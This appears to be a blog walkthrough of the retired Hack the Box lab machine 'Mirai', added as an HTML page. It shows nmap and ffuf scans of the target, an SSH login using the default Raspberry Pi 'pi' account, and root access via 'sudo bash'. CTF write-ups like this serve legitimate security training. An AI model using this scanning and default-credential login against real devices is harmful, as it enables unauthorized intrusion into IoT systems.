@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Hack the Box - Mirai - Calxus Blog</title>
+
+  <!-- Edit site and author settings in `_config.yml` to make the social details your own -->
+
+    <meta content="Calxus Blog" property="og:site_name">
+  
+    <meta content="Hack the Box - Mirai" property="og:title">
+  
+  
+    <meta content="article" property="og:type">
+  
+  
+    <meta content="Mirai demonstrates one of the fastest-growing attack vectors in modern times; improperly configured IoT devices. This attack vector is constantly on the rise as more and more IoT devices are being created and deployed around the globe, and is actively being exploited by a wide variety of botnets. Internal IoT devices are also being used for long-term persistence by malicious actors." property="og:description">
+  
+  
+    <meta content="http://localhost:4000/mirai-walkthrough/" property="og:url">
+  
+  
+    <meta content="2020-07-02T20:51:22+01:00" property="article:published_time">
+    <meta content="http://localhost:4000/about/" property="article:author">
+  
+  
+    <meta content="http://localhost:4000/assets/img/mirai.png" property="og:image">
+  
+  
+    
+    <meta content="HackTheBox" property="article:section">
+    
+  
+  
+    
+    <meta content="Easy" property="article:tag">
+    
+    <meta content="Linux" property="article:tag">
+    
+    <meta content="Retired" property="article:tag">
+    
+    <meta content="CTF" property="article:tag">
+    
+  
+  
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@TheCalxus">
+  
+    <meta name="twitter:title" content="Hack the Box - Mirai">
+  
+  
+    <meta name="twitter:url" content="http://localhost:4000/mirai-walkthrough/">
+  
+  
+    <meta name="twitter:description" content="Mirai demonstrates one of the fastest-growing attack vectors in modern times; improperly configured IoT devices. This attack vector is constantly on the rise as more and more IoT devices are being created and deployed around the globe, and is actively being exploited by a wide variety of botnets. Internal IoT devices are also being used for long-term persistence by malicious actors.">
+  
+  
+    <meta name="twitter:image:src" content="http://localhost:4000/assets/img/mirai.png">
+  
+
+	<meta name="description" content="Mirai demonstrates one of the fastest-growing attack vectors in modern times; improperly configured IoT devices. This attack vector is constantly on the rise as more and more IoT devices are being created and deployed around the globe, and is actively being exploited by a wide variety of botnets. Internal IoT devices are also being used for long-term persistence by malicious actors.">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta property="og:image" content="">
+	<link rel="shortcut icon" href="/assets/img/favicon/favicon.ico" type="image/x-icon">
+	<!-- Chrome, Firefox OS and Opera -->
+	<meta name="theme-color" content="#263959">
+	<!-- Windows Phone -->
+	<meta name="msapplication-navbutton-color" content="#263959">
+	<!-- iOS Safari -->
+	<meta name="apple-mobile-web-app-status-bar-style" content="#263959">
+	<!-- Google Fonts -->
+	<link href="https://fonts.googleapis.com/css?family=PT+Serif:400,700|Lato:300,400,700&display=swap" rel="stylesheet">
+	<!-- Font Awesome -->
+	<link rel="stylesheet" href="/assets/fonts/font-awesome/css/font-awesome.min.css">
+	<!-- Styles -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+</head>
+
+<body>
+
+  <div class="wrapper">
+    <aside class="sidebar">
+  <header>
+    <div class="about">
+      <div class="cover-author-image">
+        <a href="/"><img src="/assets/img/calxus.png" alt="Calxus"></a>
+      </div>
+      <div class="author-name">Calxus</div>
+      <p>DevOps Engineer with a penchant for pentesting and proud owner of an over-engineered home network</p>
+      <div style="height: 5px"></div>
+      <div class="author-name"><a href="/hackthebox">hack the box</a></div>
+      <div class="site-category"><a href="/homenetwork">home network</a></div>
+    </div>
+  </header> <!-- End Header -->
+  <footer>
+    <section class="contact">
+      <h3 class="contact-title">Contact me</h3>
+      <ul>
+        <li><a href="https://twitter.com/TheCalxus" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+        <li class="github"><a href="http://github.com/calxus" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li class="email"><a href="mailto:calxus@protonmail.ch"><i class="fa fa-envelope-o"></i></a></li>
+        <li><a href="https://hackthebox.eu/profile/317303" target="_blank"><i class="fa fa-cube"></i></a></li>
+      </ul>
+    </section> <!-- End Section Contact -->
+    <div class="copyright">
+      <p>2021 &copy; Calxus</p>
+    </div>
+  </footer> <!-- End Footer -->
+</aside> <!-- End Sidebar -->
+<div class="content-box clearfix">
+  <article class="article-page">
+  <div class="page-content">
+    
+    <div class="page-cover-image">
+      <figure>
+        <img class="page-image" src=/assets/img/mirai.png alt="Hack the Box - Mirai">
+        
+          <figcaption>Mirai</figcaption>
+        
+      </figure>
+    </div> <!-- End Page Cover Image -->
+    
+    <div class="wrap-content">
+      <header class="header-page">
+        <h1 class="page-title">Hack the Box - Mirai</h1>
+        <div class="page-date"><span>2020, Jul 02&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+      </header>
+      <h2 id="overview">Overview</h2>
+<p>Mirai demonstrates one of the fastest-growing attack vectors in modern times; improperly configured IoT devices. This attack vector is constantly on the rise as more and more IoT devices are being created and deployed around the globe, and is actively being exploited by a wide variety of botnets. Internal IoT devices are also being used for long-term persistence by malicious actors.</p>
+<h2 id="enumeration">Enumeration</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/mirai]
+└─$ sudo nmap -p22,53,80,1058,32400,32469 10.129.114.18 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 21:12 GMT
+Nmap scan report for 10.129.114.18
+Host is up (0.016s latency).
+
+PORT      STATE SERVICE
+22/tcp    open  ssh
+53/tcp    open  domain
+80/tcp    open  http
+1058/tcp  open  nim
+32400/tcp open  plex
+32469/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
+                                                                                                                                                                                                                                             
+┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/mirai]
+└─$ sudo nmap -p22,53,80,1058,32400,32469 -sV 10.129.114.18
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 21:12 GMT
+Nmap scan report for 10.129.114.18
+Host is up (0.016s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+53/tcp    open  domain  dnsmasq 2.76
+80/tcp    open  http    lighttpd 1.4.35
+1058/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
+32400/tcp open  http    Plex Media Server httpd
+32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds
+</code></pre></div></div>
+<p>After port enumeration there were a couple of interesting ports that could be investigated. However starting with the webserver on port 80, which returns a blank page at the root, we’ll start with running a fuzzer.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/mirai]
+└─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.114.18/FUZZ            
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.2.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.114.18/FUZZ
+ :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
+versions                [Status: 200, Size: 18, Words: 1, Lines: 1]
+</code></pre></div></div>
+<p>The fuzzer reveals a couple of interesting pages. Navigating to the admin page we find a raspberry pi admin interface. On seeing this there is a chance the well known default credentials for SSH to Raspberry Pi’s may work.</p>
+<h2 id="foothold">Foothold</h2>
+<p>When trying the default credentials it was successful and access was granted.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/mirai]
+└─$ ssh pi@10.129.114.18                                   
+pi@10.129.114.18's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug 27 14:47:50 2017 from localhost
+
+SSH is enabled and the default password for the 'pi' user has not been changed.
+This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.
+
+pi@raspberrypi:~ $
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Privilege escalation was trivial as the user pi was in the sudoers list.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~ $ sudo bash
+root@raspberrypi:/home/pi#
+</code></pre></div></div>
+
+      <div class="page-footer">
+        <div class="page-share">
+          <a href="https://twitter.com/intent/tweet?text=Hack the Box - Mirai&url=http://localhost:4000/mirai-walkthrough/" title="Share on Twitter" rel="nofollow" target="_blank">Twitter</a>
+          <a href="https://facebook.com/sharer.php?u=http://localhost:4000/mirai-walkthrough/" title="Share on Facebook" rel="nofollow" target="_blank">Facebook</a>
+          <a href="https://plus.google.com/share?url=http://localhost:4000/mirai-walkthrough/" title="Share on Google+" rel="nofollow" target="_blank">Google+</a>
+        </div>
+        <div class="page-tag">
+          
+            <a href="/tags#Easy" class="tag">&#35; Easy</a>
+          
+            <a href="/tags#Linux" class="tag">&#35; Linux</a>
+          
+            <a href="/tags#Retired" class="tag">&#35; Retired</a>
+          
+            <a href="/tags#CTF" class="tag">&#35; CTF</a>
+          
+        </div>
+      </div>
+    </div> <!-- End Wrap Content -->
+  </div> <!-- End Page Content -->
+</article> <!-- End Article Page -->
+
+</div>
+
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.0.0/dist/lazyload.min.js"></script>
+<script src="/assets/js/main.js"></script>
+
+</body>
+</html>
